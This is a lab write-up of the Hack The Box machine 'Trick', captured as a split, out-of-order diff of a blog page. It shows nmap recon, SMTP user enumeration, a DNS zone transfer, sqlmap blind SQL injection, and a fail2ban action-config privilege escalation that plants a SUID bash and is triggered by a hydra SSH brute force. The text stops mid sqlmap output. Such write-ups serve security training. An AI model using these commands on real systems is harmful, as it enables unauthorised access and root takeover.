-</span></span><span class=line><span class=cl><span class=nv>banaction_allports</span> <span class=o>=</span> iptables-allports
-</span></span></code></pre></div><p><code>bantime = 10s</code> and <code>banaction = iptables-multiport</code>. The <code>iptables-multiport.conf</code> action file is what gets executed when fail2ban decides to ban an IP. The <code>actionban</code> directive in that file is the shell command that runs, as root, because fail2ban runs as root.</p><p>The exploit:</p><ol><li>Delete <code>iptables-multiport.conf</code> from <code>action.d/</code> (allowed because we can write to the directory)</li><li>Copy it to <code>/tmp</code>, edit <code>actionban</code> to copy bash and set SUID</li><li>Copy the modified version back into <code>action.d/</code></li><li>Restart fail2ban with sudo so it loads the new config</li><li>Trigger an SSH brute-force against the box so fail2ban fires the ban action</li><li>Run the SUID binary</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>michael@trick:~$ rm /etc/fail2ban/action.d/iptables-multiport.conf
-</span></span><span class=line><span class=cl>rm: remove write-protected regular file <span class=s1>&#39;/etc/fail2ban/action.d/iptables-multiport.conf&#39;</span>? y
-</span></span><span class=line><span class=cl>michael@trick:~$ cp /tmp/iptables-multiport.conf /etc/fail2ban/action.d/iptables-multiport.conf
-</span></span><span class=line><span class=cl>michael@trick:~$ sudo /etc/init.d/fail2ban restart
-</span></span><span class=line><span class=cl><span class=o>[</span> ok <span class=o>]</span> Restarting fail2ban <span class=o>(</span>via systemctl<span class=o>)</span>: fail2ban.service.
-</span></span></code></pre></div><p>The modified <code>actionban</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>actionban</span> <span class=o>=</span> cp /bin/bash /tmp/kanyo<span class=p>;</span> chmod <span class=m>4755</span> /tmp/kanyo
-</span></span></code></pre></div><p>Then triggered the ban with hydra:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>~ ✗ hydra -l root -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-10.txt ssh://10.129.227.180
-</span></span><span class=line><span class=cl>Hydra v9.7 <span class=o>(</span>c<span class=o>)</span> <span class=m>2023</span> by van Hauser/THC <span class=p>&amp;</span> David Maciejak - Please <span class=k>do</span> not use in military or secret service organizations, or <span class=k>for</span> illegal purposes <span class=o>(</span>this is non-binding, these *** ignore laws and ethics anyway<span class=o>)</span>.
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>Hydra <span class=o>(</span>https://github.com/vanhauser-thc/thc-hydra<span class=o>)</span> starting at 2026-06-08 12:50:55
-</span></span><span class=line><span class=cl><span class=o>[</span>WARNING<span class=o>]</span> Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t <span class=m>4</span>
-</span></span><span class=line><span class=cl><span class=o>[</span>DATA<span class=o>]</span> max <span class=m>16</span> tasks per <span class=m>1</span> server, overall <span class=m>16</span> tasks, <span class=m>92</span> login tries <span class=o>(</span>l:1/p:92<span class=o>)</span>, ~6 tries per task
-</span></span><span class=line><span class=cl><span class=o>[</span>DATA<span class=o>]</span> attacking ssh://10.129.227.180:22/
-</span></span><span class=line><span class=cl><span class=m>1</span> of <span class=m>1</span> target completed, <span class=m>0</span> valid password found
-</span></span><span class=line><span class=cl>Hydra <span class=o>(</span>https://github.com/vanhauser-thc/thc-hydra<span class=o>)</span> finished at 2026-06-08 12:51:30
-</span></span></code></pre></div><p>Back on the box:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>michael@trick:/tmp$ ls
-</span></span><span class=line><span class=cl>iptables-multiport.conf
-</span></span><span class=line><span class=cl>kanyo
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>michael@trick:/tmp$ /tmp/kanyo -p
-</span></span><span class=line><span class=cl>kanyo-5.0# whoami
-</span></span><span class=line><span class=cl>root
-</span></span><span class=line><span class=cl>kanyo-5.0# <span class=nb>cd</span> /root
-</span></span></code></pre></div><p>Root flag.</p><p>The fail2ban abuse is one of those privescs that feels inevitable once you see the setup. Write access to action configs plus a NOPASSWD service restart is a complete chain: you control what runs as root and you control when it runs. The 10-second ban time is tight but hydra hammers fast enough that it trips the threshold. Worth keeping in mind any time you see a user in a group with names like <code>security</code>, <code>monitoring</code>, or <code>log</code>. Those often have write access to config files that feed into services running as root.</p></div></article></main></div><script>function toggleToc(){const e=document.getElementById("tocContent"),t=document.querySelector(".toc-toggle");if(!e||!t)return;e.classList.toggle("expanded"),t.classList.toggle("expanded")}function toggleMiniToc(){const e=document.getElementById("miniToc");e&&e.classList.toggle("minimized")}function setupActiveHighlighting(e){const n=Array.from(e).map(e=>{const t=e.getAttribute("href");if(t&&t.startsWith("#")){const n=document.getElementById(decodeURIComponent(t.slice(1)));if(n)return{link:e,element:n}}return null}).filter(Boolean);if(n.length===0)return;function s(){const s=window.scrollY+100;let t=null;n.forEach(e=>{e.element.offsetTop<=s&&(t=e)}),e.forEach(e=>e.classList.remove("active")),t&&t.link.classList.add("active")}let t=!1;window.addEventListener("scroll",()=>{t||(requestAnimationFrame(()=>{s(),t=!1}),t=!0)}),s()}function initMiniToc(){const n=document.getElementById("miniToc"),s=document.getElementById("miniTocContent"),o=document.getElementById("tocContent");if(!n||!s||!o)return;const e=o.cloneNode(!0);e.classList.remove("toc-content","expanded"),e.removeAttribute("id");const t=e.querySelectorAll("a");if(t.length===0)return;t.forEach(e=>{e.addEventListener("click",t=>{const n=e.getAttribute("href");if(n&&n.startsWith("#")){const e=document.getElementById(decodeURIComponent(n.slice(1)));e&&(t.preventDefault(),e.scrollIntoView({behavior:"smooth",block:"start"}),history.pushState(null,"",n))}})}),s.appendChild(e),n.classList.add("visible"),setupActiveHighlighting(t)}document.addEventListener("DOMContentLoaded",initMiniToc)</script><footer class=footer><span class=footer_item></span>&nbsp;<div class=footer_social-icons><a href=https://discord.com/users/kanyo._ target=_blank rel="noopener noreferrer me" title=Discord><svg viewBox="20 15 205 190" fill="currentColor" stroke="none"><path d="M104.4 103.9c-5.7.0-10.2 5-10.2 11.1s4.6 11.1 10.2 11.1c5.7.0 10.2-5 10.2-11.1.1-6.1-4.5-11.1-10.2-11.1zm36.5.0c-5.7.0-10.2 5-10.2 11.1s4.6 11.1 10.2 11.1c5.7.0 10.2-5 10.2-11.1s-4.5-11.1-10.2-11.1z"/><path d="M189.5 20h-134C44.2 20 35 29.2 35 40.6v135.2c0 11.4 9.2 20.6 20.5 20.6h113.4l-5.3-18.5 12.8 11.9 12.1 11.2 21.5 19V40.6c0-11.4-9.2-20.6-20.5-20.6zm-38.6 130.6s-3.6-4.3-6.6-8.1c13.1-3.7 18.1-11.9 18.1-11.9-4.1 2.7-8 4.6-11.5 5.9-5 2.1-9.8 3.5-14.5 4.3-9.6 1.8-18.4 1.3-25.9-.1-5.7-1.1-10.6-2.7-14.7-4.3-2.3-.9-4.8-2-7.3-3.4-.3-.2-.6-.3-.9-.5-.2-.1-.3-.2-.4-.3-1.8-1-2.8-1.7-2.8-1.7s4.8 8 17.5 11.8c-3 3.8-6.7 8.3-6.7 8.3-22.1-.7-30.5-15.2-30.5-15.2.0-32.2 14.4-58.3 14.4-58.3 14.4-10.8 28.1-10.5 28.1-10.5l1 1.2c-18 5.2-26.3 13.1-26.3 13.1s2.2-1.2 5.9-2.9c10.7-4.7 19.2-6 22.7-6.3.6-.1 1.1-.2 1.7-.2 6.1-.8 13-1 20.2-.2 9.5 1.1 19.7 3.9 30.1 9.6.0.0-7.9-7.5-24.9-12.7l1.4-1.6s13.7-.3 28.1 10.5c0 0 14.4 26.1 14.4 58.3.0.0-8.5 14.5-30.6 15.2z"/></svg></a>
-<a href=https://github.com/Chaelsoo target=_blank rel="noopener noreferrer me" title=Github><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37.0 00-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44.0 0020 4.77 5.07 5.07.0 0019.91 1S18.73.65 16 2.48a13.38 13.38.0 00-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07.0 005 4.77 5.44 5.44.0 003.5 8.55c0 5.42 3.3 6.61 6.44 7A3.37 3.37.0 009 18.13V22"/></svg></a>
-<a href=https://www.linkedin.com/in/abderrahmen-dellaa-a78517249/ target=_blank rel="noopener noreferrer me" title=Linkedin><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 016 6v7h-4v-7a2 2 0 00-2-2 2 2 0 00-2 2v7h-4v-7a6 6 0 016-6z"/><rect x="2" y="9" width="4" height="12"/><circle cx="4" cy="4" r="2"/></svg></a>
-<a href=https://app.hackthebox.com/users/1490281 target=_blank rel="noopener noreferrer me" title=Hackthebox><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M12 1 2 6.5v11L12 23l10-5.5v-11L12 1z"/><path d="M12 12 2 6.5M12 12v11m0-11 10-5.5"/></svg></a></div><small class=footer_copyright>© 2026 .
-Powered by <a href=https://github.com/hugo-sid/hugo-blog-awesome target=_blank rel=noopener>Hugo blog awesome</a>.</small></footer><a href=# title="Go to top" id=totop><svg width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960"><path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197z"/></svg>
-</a><script src=https://chaelsoo.me/js/main.min.b09c6387b2f6ee79fac79c531b410d511da72f67534abd4435676936738db1e1.js integrity="sha256-sJxjh7L27nn6x5xTG0ENUR2nL2dTSr1ENWdpNnONseE="></script></body></html>
+<!DOCTYPE html>
+<html lang="en-gb"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">HTB: Trick | kanyo&#39;s blog</title>
+<meta property="og:title" content="HTB: Trick | kanyo&#39;s blog" />
+<meta name="twitter:title" content="HTB: Trick | kanyo&#39;s blog" />
+<meta itemprop="name" content="HTB: Trick | kanyo&#39;s blog" />
+<meta name="application-name" content="HTB: Trick | kanyo&#39;s blog" />
+<meta property="og:site_name" content="" />
+
+<meta name="description" content="An Easy Linux box that chains a DNS zone transfer into a time-based blind SQLi, then pivots to a second preprod subdomain where unfiltered LFI gives michael&#39;s SSH key. The privilege escalation abuses write access to fail2ban&#39;s action configs and a NOPASSWD restart to plant a SUID shell.">
+<meta itemprop="description" content="An Easy Linux box that chains a DNS zone transfer into a time-based blind SQLi, then pivots to a second preprod subdomain where unfiltered LFI gives michael&#39;s SSH key. The privilege escalation abuses write access to fail2ban&#39;s action configs and a NOPASSWD restart to plant a SUID shell." />
+<meta property="og:description" content="An Easy Linux box that chains a DNS zone transfer into a time-based blind SQLi, then pivots to a second preprod subdomain where unfiltered LFI gives michael&#39;s SSH key. The privilege escalation abuses write access to fail2ban&#39;s action configs and a NOPASSWD restart to plant a SUID shell." />
+<meta name="twitter:description" content="An Easy Linux box that chains a DNS zone transfer into a time-based blind SQLi, then pivots to a second preprod subdomain where unfiltered LFI gives michael&#39;s SSH key. The privilege escalation abuses write access to fail2ban&#39;s action configs and a NOPASSWD restart to plant a SUID shell." />
+
+<meta property="og:locale" content="en-gb" />
+<meta name="language" content="en-gb" />
+
+  <link rel="alternate" hreflang="en-gb" href="http://localhost:1313/writeups/htb-trick/" title="English" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.161.1">
+
+    
+    <meta property="og:url" content="http://localhost:1313/writeups/htb-trick/">
+  <meta property="og:site_name" content="kanyo&#39;s blog">
+  <meta property="og:title" content="HTB: Trick">
+  <meta property="og:description" content="An Easy Linux box that chains a DNS zone transfer into a time-based blind SQLi, then pivots to a second preprod subdomain where unfiltered LFI gives michael&#39;s SSH key. The privilege escalation abuses write access to fail2ban&#39;s action configs and a NOPASSWD restart to plant a SUID shell.">
+  <meta property="og:locale" content="en_gb">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="writeups">
+    <meta property="article:published_time" content="2026-06-08T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-06-08T00:00:00+00:00">
+    <meta property="article:tag" content="Fail2ban">
+    <meta property="article:tag" content="Lfi">
+    <meta property="article:tag" content="Sqli">
+    <meta property="article:tag" content="Linux">
+
+
+    
+    
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="HTB: Trick">
+  <meta name="twitter:description" content="An Easy Linux box that chains a DNS zone transfer into a time-based blind SQLi, then pivots to a second preprod subdomain where unfiltered LFI gives michael&#39;s SSH key. The privilege escalation abuses write access to fail2ban&#39;s action configs and a NOPASSWD restart to plant a SUID shell.">
+
+
+    
+
+    <link rel="canonical" href="http://localhost:1313/writeups/htb-trick/">
+    <link href="/style.min.2dc4fd9484cccdeb4e540eaff87cc3f2c37bacb70d134bbaec04ff76525358fc.css" rel="stylesheet">
+    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
+    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
+    <link rel="shortcut icon" href="/favicon.ico">
+
+
+
+
+<link rel="manifest" href="http://localhost:1313/site.webmanifest">
+
+<meta name="msapplication-config" content="/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#2d89ef">
+<meta name="theme-color" content="#434648">
+
+    
+    
+</head>
+<body data-theme = "dark" class="notransition">
+
+<script src="/js/theme.js"></script>
+
+<div class="navbar" role="navigation">
+    <nav class="menu" aria-label="Main Navigation">
+        <a href="http://localhost:1313/" class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
+viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
+stroke-linejoin="round" class="feather feather-home">
+<title>Home</title>
+<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+<polyline points="9 22 9 12 15 12 15 22"></polyline>
+</svg>
+        </a>
+        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+        <label for="menu-trigger">
+            <span class="menu-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+            </span>
+        </label>
+
+        <div class="trigger">
+            <ul class="trigger-container">
+                
+                
+                <li>
+                    <a class="menu-link " href="/">
+                        Home
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/blogs/">
+                        Blogs
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link active" href="/writeups/">
+                        Writeups
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/about/">
+                        About
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="https://notes.chaelsoo.me">
+                        Cheatsheet
+                    </a>
+                    
+                </li>
+                
+                <li class="menu-separator">
+                    <span>|</span>
+                </li>
+                
+                
+            </ul>
+            <a id="mode" href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+            </a>
+        </div>
+    </nav>
+</div>
+
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">HTB: Trick</h1>
+                
+                
+                
+                <div class="post-meta">
+                    <time datetime="2026-06-08T00:00:00&#43;00:00" itemprop="datePublished"> 8 Jun 2026 </time>
+                </div>
+                
+            </header>
+            
+            <img src="/images/writeups/htb-trick/htb-trick-pwned.png" alt="HTB: Trick" style="width:100%;border-radius:0.5rem;margin:1.5rem 0;" />
+            
+            <div class="toc-container">
+    <button class="toc-toggle" type="button" onclick="toggleToc()">Table of Contents</button>
+    <div class="toc-content" id="tocContent">
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#recon">Recon</a></li>
+    <li><a href="#payroll-sqli">Payroll SQLi</a></li>
+    <li><a href="#lfi-on-preprod-marketing">LFI on preprod-marketing</a></li>
+    <li><a href="#privilege-escalation-fail2ban">Privilege Escalation: fail2ban</a></li>
+  </ul>
+</nav>
+    </div>
+</div>
+
+<div class="mini-toc" id="miniToc">
+    <div class="mini-toc-header">
+        <div class="mini-toc-title">Contents</div>
+        <button class="mini-toc-minimize" type="button" onclick="toggleMiniToc()" aria-label="Minimize TOC">
+            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 16 16">
+                <path fill-rule="evenodd" d="M1 8a.5.5 0 0 1 .5-.5h13a.5.5 0 0 1 0 1h-13A.5.5 0 0 1 1 8zM7.646 4.146a.5.5 0 0 1 .708 0l2 2a.5.5 0 0 1-.708.708L8.5 5.707V11.5a.5.5 0 0 1-1 0V5.707L6.354 6.854a.5.5 0 1 1-.708-.708l2-2z"/>
+            </svg>
+        </button>
+    </div>
+    <div class="mini-toc-content" id="miniTocContent"></div>
+</div>
+            <div class="page-content">
+                <p>An Easy box but one that makes you work for it in an unexpected direction. Port 80 is a static placeholder page with nothing on it. The real surface is DNS: zone transfer hands you a subdomain, that subdomain has a login form with a time-based blind SQLi, you get credentials, but the LFI on that same app is filtered. The actual LFI is on a second subdomain you only find by fuzzing a prefix pattern. That subdomain reads michael&rsquo;s SSH key, you get in, and the privilege escalation is a clean abuse of fail2ban&rsquo;s action config combined with <code>sudo</code> restart rights. The credentials from payroll end up being almost irrelevant to the root path, which is a bit annoying in hindsight, but the DNS zone transfer and the fail2ban trick are both things worth keeping in your toolkit.</p>
+<h2 id="recon">Recon</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/labs/trick ❯ sudo nmap -sV -sC -T4 <span class="nv">$DC</span>
+</span></span><span class="line"><span class="cl">Starting Nmap 7.99 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2026-06-08 10:37 +0100
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.129.227.180
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>4.2s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">501</span> closed tcp ports <span class="o">(</span>reset<span class="o">)</span>, <span class="m">495</span> filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">2048</span> 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">25/tcp open  smtp?
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_smtp-commands: Couldn<span class="err">&#39;</span>t establish connection on port <span class="m">25</span>
+</span></span><span class="line"><span class="cl">53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 <span class="o">(</span>Debian Linux<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> dns-nsid: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
+</span></span><span class="line"><span class="cl">80/tcp open  http    nginx 1.14.2
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: nginx/1.14.2
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Coming Soon - Start Bootstrap Theme
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></div><p>Four ports. Port 80 is a &ldquo;coming soon&rdquo; placeholder. Port 53 is BIND, which is notable. A DNS server running on a box like this usually means there are zones to enumerate. Port 25 is SMTP but didn&rsquo;t respond to connection. I checked SMTP first to see if VRFY enumeration would work:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">VRFY root
+</span></span><span class="line"><span class="cl"><span class="m">252</span> 2.0.0 root
+</span></span><span class="line"><span class="cl">VRFY admin
+</span></span><span class="line"><span class="cl"><span class="m">550</span> 5.1.1 &lt;admin&gt;: Recipient address rejected: User unknown in <span class="nb">local</span> recipient table
+</span></span><span class="line"><span class="cl">VRFY user
+</span></span><span class="line"><span class="cl"><span class="m">550</span> 5.1.1 &lt;user&gt;: Recipient address rejected: User unknown in <span class="nb">local</span> recipient table
+</span></span><span class="line"><span class="cl">VRFY www-data
+</span></span><span class="line"><span class="cl"><span class="m">252</span> 2.0.0 www-data
+</span></span></code></pre></div><p><code>root</code> and <code>www-data</code> exist. Useful context, but no direct attack path from here.</p>
+<p>Vhost fuzzing on port 80 found nothing useful. Port 53 is the more interesting angle. DNS servers that are misconfigured to allow zone transfers will hand you the complete DNS record set for a zone, every hostname, every subdomain, in a single query. <code>dig axfr</code> sends a zone transfer request:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/labs/trick ❯ dig axfr @<span class="nv">$DC</span> trick.htb
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">;</span> &lt;&lt;&gt;&gt; DiG 9.20.23 &lt;&lt;&gt;&gt; axfr @10.129.227.180 trick.htb
+</span></span><span class="line"><span class="cl"><span class="p">;</span> <span class="o">(</span><span class="m">1</span> server found<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">;;</span> global options: +cmd
+</span></span><span class="line"><span class="cl">trick.htb.		604800	IN	SOA	trick.htb. root.trick.htb. <span class="m">5</span> <span class="m">604800</span> <span class="m">86400</span> <span class="m">2419200</span> <span class="m">604800</span>
+</span></span><span class="line"><span class="cl">trick.htb.		604800	IN	NS	trick.htb.
+</span></span><span class="line"><span class="cl">trick.htb.		604800	IN	A	127.0.0.1
+</span></span><span class="line"><span class="cl">trick.htb.		604800	IN	AAAA	::1
+</span></span><span class="line"><span class="cl">preprod-payroll.trick.htb. <span class="m">604800</span> IN	CNAME	trick.htb.
+</span></span><span class="line"><span class="cl">trick.htb.		604800	IN	SOA	trick.htb. root.trick.htb. <span class="m">5</span> <span class="m">604800</span> <span class="m">86400</span> <span class="m">2419200</span> <span class="m">604800</span>
+</span></span><span class="line"><span class="cl"><span class="p">;;</span> Query time: <span class="m">267</span> msec
+</span></span><span class="line"><span class="cl"><span class="p">;;</span> SERVER: 10.129.227.180#53<span class="o">(</span>10.129.227.180<span class="o">)</span> <span class="o">(</span>TCP<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">;;</span> WHEN: Mon Jun <span class="m">08</span> 10:55:51 CET <span class="m">2026</span>
+</span></span><span class="line"><span class="cl"><span class="p">;;</span> XFR size: <span class="m">6</span> records <span class="o">(</span>messages 1, bytes 231<span class="o">)</span>
+</span></span></code></pre></div><p>One real entry: <code>preprod-payroll.trick.htb</code>.</p>
+<h2 id="payroll-sqli">Payroll SQLi</h2>
+<p>Added it to <code>/etc/hosts</code> and opened it:</p>
+<p><img src="/images/writeups/htb-trick/web-preprod-payroll-login.png" alt="preprod-payroll.trick.htb login page with username and password fields"></p>
+<p>A login form. Time-based blind SQL injection is the type where the database pauses execution for a set number of seconds when the condition is true. The attacker infers data character by character from whether the response is delayed. It&rsquo;s slow but reliable when error-based injection is suppressed. I saved the login request from Burp and pointed sqlmap at it:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/labs/trick ❯ sqlmap -r login_req 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>11:03:11<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> parsing HTTP request from <span class="s1">&#39;login_req&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>11:03:11<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing connection to the target URL
+</span></span><span class="line"><span class="cl"><span class="o">[</span>11:03:11<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> checking <span class="k">if</span> the target is protected by some kind of WAF/IPS
+</span></span><span class="line"><span class="cl"><span class="o">[</span>11:03:11<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="k">if</span> the target URL content is stable
+</span></span><span class="line"><span class="cl"><span class="o">[</span>11:03:12<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> target URL content is stable
+</span></span><span class="line"><span class="cl"><span class="o">[</span>11:03:12<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="k">if</span> POST parameter <span class="s1">&#39;username&#39;</span> is dynamic
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>11:08:20<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> checking <span class="k">if</span> the injection point on POST parameter <span class="s1">&#39;username&#39;</span> is a <span class="nb">false</span> positive
+</span></span><span class="line"><span class="cl">POST parameter <span class="s1">&#39;username&#39;</span> is vulnerable. Do you want to keep testing the others <span class="o">(</span><span class="k">if</span> any<span class="o">)</span>? <span class="o">[</span>y/N<span class="o">]</span> N
+</span></span><span class="line"><span class="cl">sqlmap identified the following injection point<span class="o">(</span>s<span class="o">)</span> with a total of <span class="m">1304</span> HTTP<span class="o">(</span>s<span class="o">)</span> requests:
+</span></span><span class="line"><span class="cl">---
+</span></span><span class="line"><span class="cl">Parameter: username <span class="o">(</span>POST<span class="o">)</span>
+</span></span><span class="line"><span class="cl">    Type: time-based blind
+</span></span><span class="line"><span class="cl">    Title: MySQL &gt;<span class="o">=</span> 5.0.12 AND time-based blind <span class="o">(</span>query SLEEP<span class="o">)</span>
